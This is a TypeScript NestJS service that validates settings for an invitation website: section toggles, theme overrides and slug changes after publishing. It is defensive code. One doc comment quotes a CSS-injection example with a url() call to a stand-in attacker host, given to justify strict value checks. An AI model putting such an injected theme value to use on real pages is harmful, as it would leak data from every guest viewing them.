import { Injectable } from "@nestjs/common";

import {
  BusinessRuleError,
  ConflictError,
  NotFoundError,
  ValidationError,
} from "../../http/errors";
import { logger } from "../../shared/logging/logger";
import type { TenantScope } from "../../shared/tenancy/tenant-scope";
import { InvitationRepository } from "../../shared/tenancy/invitation-repository";
import { requireOwnership } from "../../shared/auth-middleware";
import { CSS_TOKEN, HEX_COLOR } from "@wi/schema";
import { SlugService } from "./slug.service";
import type { SettingsDto } from "./invitation.dto";

/**
 * P1-14 — settings and slug rules. `docs/API/04` § Settings, BR-6.
 *
 * ## One screen, two tables
 *
 * `docs/PLAN/08` § Where Settings Fields Physically Live (ADR-022): `slug` and
 * `expiry_date` are columns on `invitations` because they are on the public request path
 * (`WHERE slug = ? AND status = 'published'`), and the toggles live on
 * `invitation_settings` because they are read and changed together. The API keeps the
 * domain grouping and this service writes to whichever table owns the column — "users
 * should not have to know the schema to change a setting."
 *
 * ## The customization boundary is only a boundary if it rejects
 *
 * `enabled_sections` and `theme_override` are both validated **against the invitation's
 * active template version**, not against a static list. A section key the template does
 * not define, or a theme key outside `customizable_theme_keys`, is **rejected** rather than
 * stored and ignored. Stored-and-ignored is the failure that looks like success: the user
 * sets a colour, the API returns 200, and the page does not change — and there is nothing
 * anywhere saying why.
 */

/** What the template's `sections` array tells us about one section. */
interface TemplateSection {
  readonly section_key?: unknown;
  readonly configurable?: unknown;
  readonly enabled_by_default?: unknown;
}

/** One section of a template definition, as the rest of the codebase wants to read it. */
export interface ParsedSection {
  readonly key: string;
  readonly configurable: boolean;
  readonly enabledByDefault: boolean;
}

export interface SettingsPatch {
  readonly enabledSections?: readonly string[] | undefined;
  readonly themeOverride?: Record<string, unknown> | undefined;
  readonly rsvpEnabled?: boolean | undefined;
  readonly guestbookEnabled?: boolean | undefined;
  readonly guestbookModeration?: boolean | undefined;
  readonly seoIndexable?: boolean | undefined;
  /** Lives on `invitations`, presented here. BR-6.2 governs when it may change. */
  readonly slug?: string | undefined;
  /**
   * BR-6.2: after publishing, a slug change "requires explicit confirmation (since old
   * links become invalid)". The confirmation is a field rather than a header because it
   * has to survive a proxy and be visible in a request log during an incident.
   */
  readonly confirmSlugChange?: boolean | undefined;
}

export interface SettingsResult extends SettingsDto {
  readonly slug: string | null;
}

@Injectable()
export class SettingsService {
  constructor(
    private readonly repository: InvitationRepository,
    private readonly slugs: SlugService,
  ) {}

  async get(scope: TenantScope, invitationId: string): Promise<SettingsResult> {
    const invitation = await requireOwnership(
      () => this.repository.findOwned(invitationId, scope),
      { scope, resourceType: "invitation", resourceId: invitationId },
    );

    const settings = await this.repository.findOwnedSettings(
      invitationId,
      scope,
    );

    return {
      slug: invitation.slug,
      enabled_sections: [...(settings?.enabledSections ?? [])],
      theme_override: settings?.themeOverride ?? {},
      rsvp_enabled: settings?.rsvpEnabled ?? true,
      guestbook_enabled: settings?.guestbookEnabled ?? true,
      guestbook_moderation: settings?.guestbookModeration ?? false,
      seo_indexable: settings?.seoIndexable ?? false,
    };
  }

  async update(
    scope: TenantScope,
    invitationId: string,
    patch: SettingsPatch,
  ): Promise<SettingsResult> {
    const invitation = await requireOwnership(
      () => this.repository.findOwned(invitationId, scope),
      { scope, resourceType: "invitation", resourceId: invitationId },
    );

    const template = await this.repository.findTemplateVersionFor(
      invitationId,
      scope,
    );
    if (template === null) throw new NotFoundError();

    if (patch.enabledSections !== undefined) {
      await this.assertSectionsValid(
        invitationId,
        scope,
        template.sections,
        patch.enabledSections,
      );
    }

    if (patch.themeOverride !== undefined) {
      assertThemeKeysValid(template.customizableThemeKeys, patch.themeOverride);
    }

    if (patch.slug !== undefined) {
      await this.applySlugChange(scope, invitation, patch);
    }

    const toggles: Parameters<InvitationRepository["updateSettings"]>[2] = {
      ...(patch.enabledSections !== undefined
        ? { enabledSections: patch.enabledSections }
        : {}),
      ...(patch.themeOverride !== undefined
        ? { themeOverride: patch.themeOverride }
        : {}),
      ...(patch.rsvpEnabled !== undefined
        ? { rsvpEnabled: patch.rsvpEnabled }
        : {}),
      ...(patch.guestbookEnabled !== undefined
        ? { guestbookEnabled: patch.guestbookEnabled }
        : {}),
      ...(patch.guestbookModeration !== undefined
        ? { guestbookModeration: patch.guestbookModeration }
        : {}),
      ...(patch.seoIndexable !== undefined
        ? { seoIndexable: patch.seoIndexable }
        : {}),
    };

    if (Object.keys(toggles).length > 0) {
      await this.repository.updateSettings(invitationId, scope, toggles);
    }

    return this.get(scope, invitationId);
  }

  /**
   * Two rules, from `docs/PLAN/07` § Section System and `docs/FRONTEND/04` step 2.
   *
   * **Every entry must be a `section_key` the template defines.** A key the template does
   * not know is not a section that can render; storing it would mean the settings object
   * disagrees with the page forever, silently.
   *
   * **A section with `configurable: false` cannot be disabled.** The template author marked
   * it structural — a hero the user can switch off is a blank invitation, and the template
   * says so in data rather than the renderer having to defend against it.
   */
  private async assertSectionsValid(
    invitationId: string,
    scope: TenantScope,
    sections: unknown,
    requested: readonly string[],
  ): Promise<void> {
    const defined = parseSections(sections);
    const known = new Set(defined.map((s) => s.key));

    const unknown = requested.filter((key) => !known.has(key));
    if (unknown.length > 0) {
      throw new ValidationError(
        unknown.map((key) => ({
          field: "enabled_sections",
          message: `Template ini tidak memiliki bagian "${key}".`,
        })),
      );
    }

    const duplicates = requested.filter(
      (key, index) => requested.indexOf(key) !== index,
    );
    if (duplicates.length > 0) {
      // A duplicate is not dangerous and it is not meaningful either. Rejecting it keeps
      // the stored array a set, which is what every reader assumes it is.
      throw new ValidationError([
        {
          field: "enabled_sections",
          message: `Bagian "${duplicates[0]!}" disebut lebih dari sekali.`,
        },
      ]);
    }

    const requestedSet = new Set(requested);
    const structuralOff = defined
      .filter((s) => !s.configurable && !requestedSet.has(s.key))
      .map((s) => s.key);

    if (structuralOff.length > 0) {
      throw new BusinessRuleError(
        "SECTION_NOT_CONFIGURABLE",
        `Bagian "${structuralOff[0]!}" tidak dapat dimatikan pada template ini.`,
        structuralOff.map((key) => ({
          field: "enabled_sections",
          message: key,
        })),
      );
    }

    // Nothing to do with validity; it keeps the invitation id in the log line so a
    // support question about a vanished section has something to find.
    logger.info(
      {
        context: {
          invitation_id: invitationId,
          user_id: scope,
          event: "invitation.sections_changed",
          count: requested.length,
        },
      },
      "enabled sections changed",
    );
  }

  /**
   * BR-6.2 — the slug is free before the first publish and deliberate afterwards.
   *
   * "Before the first publish" is `published_at IS NULL`, not `status != 'published'`. An
   * invitation that was published and then unpublished has already had its link shared;
   * the reason for the confirmation is that **old links break**, and unpublishing does not
   * un-share them.
   */
  private async applySlugChange(
    scope: TenantScope,
    invitation: { id: string; slug: string | null; publishedAt: Date | null },
    patch: SettingsPatch,
  ): Promise<void> {
    const next = patch.slug!.trim();

    if (next === invitation.slug) return;

    const hasBeenPublished = invitation.publishedAt !== null;

    if (hasBeenPublished && patch.confirmSlugChange !== true) {
      throw new BusinessRuleError(
        "SLUG_CHANGE_NEEDS_CONFIRMATION",
        "Undangan ini sudah pernah diterbitkan. Mengubah alamatnya akan membuat tautan yang sudah dibagikan tidak berfungsi. Kirim confirm_slug_change: true untuk melanjutkan.",
      );
    }

    const rejection = await this.slugs.check(next, invitation.id);
    if (rejection !== undefined) {
      if (rejection.kind === "taken") {
        throw new ConflictError("SLUG_TAKEN", rejection.message);
      }
      throw new ValidationError([
        { field: "slug", message: rejection.message },
      ]);
    }

    const changed = await this.repository.updateSlug(
      invitation.id,
      scope,
      next,
    );

    // `docs/BACKEND/06` § Slug Validation: the check above and the write below are not
    // atomic, so two callers can both pass validation and one will lose the unique index.
    // That is a 409, not a 500 -- the caller's request was reasonable and simply lost a
    // race.
    if (!changed) {
      throw new ConflictError(
        "SLUG_TAKEN",
        "Alamat undangan ini baru saja digunakan oleh undangan lain.",
      );
    }

    if (hasBeenPublished) {
      logger.warn(
        {
          context: {
            invitation_id: invitation.id,
            user_id: scope,
            event: "invitation.slug_changed_after_publish",
          },
        },
        "slug changed on a previously published invitation; old links are now dead",
      );
    }
  }
}

/**
 * Every section a template version defines, in the template's own order.
 *
 * The single reader of `template_versions.sections` for application code. Defensive about
 * the shape because the column is `jsonb`: `P0-20`'s validator guarantees it on write, and
 * this reads rows that may predate any given version of that validator.
 *
 * `P1-15` widened it from `{ key, configurable }` to carry `enabledByDefault` as well, and
 * `defaultSections` in `invitation-create.service.ts` now delegates here. Three
 * independent readers of one JSON column would eventually disagree about a default, and the
 * disagreement would show up as a section that is on for a new invitation and off after a
 * template change.
 */
export function parseSections(sections: unknown): ParsedSection[] {
  if (!Array.isArray(sections)) return [];

  return sections
    .filter((s): s is TemplateSection => typeof s === "object" && s !== null)
    .map((s) => ({
      key: typeof s.section_key === "string" ? s.section_key : "",
      // Absent means NOT configurable. `docs/PLAN/07` writes `configurable: true`
      // explicitly for a section the user may toggle, so defaulting the other way would
      // make every section in a template that omits the flag switchable off.
      configurable: s.configurable === true,
      // Absent means off, the same way round: a template that forgets the flag produces a
      // quiet section rather than one nobody asked for.
      enabledByDefault: s.enabled_by_default === true,
    }))
    .filter((s) => s.key.length > 0);
}

/**
 * Reject any override key outside `customizable_theme_keys`.
 *
 * Dotted paths, as `docs/PLAN/07` writes them (`colors.primary`). The comparison is exact:
 * `colors` does not grant `colors.primary`, and `colors.primary` does not grant
 * `colors.primary.hover`. A prefix match would quietly widen every template's boundary the
 * first time somebody nested a value.
 */
export function assertThemeKeysValid(
  allowed: readonly string[],
  override: Record<string, unknown>,
): void {
  const permitted = new Set(allowed);
  const flattened = flatten(override);

  const offending = flattened
    .filter(({ key }) => !permitted.has(key))
    .map(({ key }) => key);

  if (offending.length > 0) {
    throw new ValidationError(
      offending.map((key) => ({
        field: "theme_override",
        message: `"${key}" tidak dapat diubah pada template ini.`,
      })),
    );
  }

  assertThemeValuesSafe(flattened);
}

/**
 * Validate the override **values**, not only the keys.
 *
 * This is the half that matters for safety, and the half that is easy to forget: a theme
 * value becomes a **CSS custom property** on the public page (`docs/FRONTEND/04` § Theme
 * Application). Unlike a template definition, which is admin-authored, an override comes
 * from an end user — so `--color-primary: red; background: url(https://evil.test/?c=…)`
 * would be a CSS injection reaching every guest who opens the invitation.
 *
 * `HEX_COLOR` and `CSS_TOKEN` are reused from `@wi/schema` rather than re-derived, because
 * the template definition and the user override should not be able to disagree about what
 * a legal theme value is. A font name gets the same allowance the definition schema gives
 * it.
 *
 * Anything else — a parenthesis, a semicolon, a brace, a backslash — is rejected. There is
 * no theme value in `docs/PLAN/07` that needs one.
 */
function assertThemeValuesSafe(
  flattened: readonly { key: string; value: unknown }[],
): void {
  const FONT_NAME = /^[A-Za-z0-9 '+_-]{1,60}$/;

  const bad = flattened.filter(({ key, value }) => {
    if (typeof value !== "string") return true;
    if (key.endsWith("_font")) return !FONT_NAME.test(value);
    return !HEX_COLOR.test(value) && !CSS_TOKEN.test(value);
  });

  if (bad.length > 0) {
    throw new ValidationError(
      bad.map(({ key }) => ({
        field: "theme_override",
        message: `Nilai untuk "${key}" tidak valid. Gunakan warna heks seperti #b76e79 atau kata tanpa spasi.`,
      })),
    );
  }
}

/** `{ colors: { primary: "#fff" } }` -> `[{ key: "colors.primary", value: "#fff" }]`. */
function flatten(
  value: unknown,
  prefix = "",
): { key: string; value: unknown }[] {
  if (typeof value !== "object" || value === null || Array.isArray(value)) {
    // An array is a leaf here deliberately: no theme value is a list, and treating one as
    // a branch would let `colors: ["#fff"]` flatten to `colors.0` and slip past the key
    // check as an unknown key rather than being rejected as a bad value.
    return prefix === "" ? [] : [{ key: prefix, value }];
  }

  return Object.entries(value).flatMap(([key, child]) =>
    flatten(child, prefix === "" ? key : `${prefix}.${key}`),
  );
}
